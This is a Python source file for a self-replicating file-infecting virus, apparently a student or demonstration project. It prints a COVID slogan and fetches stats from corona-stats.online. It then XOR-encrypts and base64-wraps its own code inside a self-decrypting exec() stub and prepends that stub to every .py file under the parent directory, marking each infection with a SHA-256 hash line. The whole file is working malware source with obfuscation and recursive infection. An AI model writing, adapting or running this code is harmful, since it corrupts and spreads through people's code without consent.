#!/usr/bin/env python3
import base64
import hashlib
import os
import random
import string
from subprocess import Popen, PIPE

API = "https://corona-stats.online?top=15"


def execute_payload():
	"""
	Executes the payload by calling "curl -s https://corona-stats.online?top=15 | head -n 37" command
	in chain. First prints the below line then shows the countries with top 15 covid-19 cases.
	"""
	print("######### DONT BE A COVIDIOT, STAY @ HOME #########")
	cmd1 = Popen(["curl", "-s"] + [API], stdout=PIPE)
	cmd2 = Popen(["head", "-n", "37"], stdin=cmd1.stdout)
	cmd1.wait()
	cmd2.wait()


def create_copy():
	"""
		This one is used for the copy creation of the malicious code.
		First it tries to access "Global variable y", if y exists, then uses it
		Otherwise creates a copy of the malicious code by reading this file.

		The "Global variable y" comes from the exec's global parameter. In this file it is not defined,
		but in the infected files it will be defined as a global parameter, as it will be passed in "exec()"
	"""
	try:
		return y
	except NameError:
		with open(os.path.basename(__file__), 'r') as source:
			data = []
			for line in source:
				data.append(line)
		return "".join(data)


def otp_keygen(size):
	"""
		Generates a random key for otp with specified size
	"""
	return ''.join(
		[random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(size)])


def xor_strs(s1, s2):
	"""
		Helper used for encryption, xors given strs
	"""
	return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2))


def encrpyt_it(stuff_to_encrpyt):
	"""
		Encrypts given string using otp with a random generated key
	"""
	key = otp_keygen(len(stuff_to_encrpyt))
	cipher_text = xor_strs(stuff_to_encrpyt, key)
	return cipher_text, key


def wrap(asset):
	"""
		Wraps the encrypted malicious code with its decrpytion key in base64 format,
		namely creates the executable part of virus.

		First exec() decodes the key and decrypts the code, second one executes the code
		with the provided globals
	"""
	encrpyted_asset, key = encrpyt_it(asset)
	base64_encoded_and_encrypted = base64.b64encode(str.encode(encrpyted_asset))
	return "exec('import base64;x=base64.b64decode(str.encode(\\'{0}\\'));" \
		   "y=\\'\\'.join(chr(ord(a) ^ ord(b)) for a, b in zip(x.decode(), \\'{1}\\'));" \
		   "exec(y, {{\\'y\\':y}})')".format(base64_encoded_and_encrypted.decode(), key)


def check_if_infected(hash_value, file):
	"""
		Checks if the previously infected file's hash value
		matches its current hash (namely checks if infected file is changed later)
	"""
	real_hash = hashlib.sha256(file.encode())
	return real_hash.hexdigest() == hash_value


def infect(troy):
	"""
		Infects all the python scripts in current and all subdirectories recursively
		with the prepared malicious code. It first calculates a hash value of malicious code +
		file's current content and injects both. In order not to inject an already infected
		file again, it first checks if a file infected by checking its first line.
		If first line includes a hash in this virus's format then it checks if this hash
		matches the current hash. If file does not include a hash then it gets infected by the virus
		or if the file includes a hash but its hash does not match (file may have been changed later)
		it overwrites the old virus injection and reinjects malicious code with the newly calculated hash value.
	"""
	for root, _, files in os.walk('..'):
		for file in files:
			relative_path = root + '/' + file
			if file.endswith(".py") and relative_path != "./virus.py":
				with open(relative_path, 'r') as original:
					first_line = original.readline()
					data = original.read()
					if first_line.startswith("#!*@"):
						if check_if_infected(first_line[4:].rstrip('\n'), data):
							continue
						else:
							data = '\n'.join(data.split('\n')[1:])
					else:
						data = first_line + data
				with open(relative_path, 'w') as modified:
					new_content = "{0}\n{1}".format(troy, data)
					content_hash = hashlib.sha256(new_content.encode())
					modified.write("#!*@{0}\n{1}".format(content_hash.hexdigest(), new_content))


def virus_routine():
	execute_payload()
	malicious_copy = create_copy()
	troy = wrap(malicious_copy)
	infect(troy)


virus_routine()
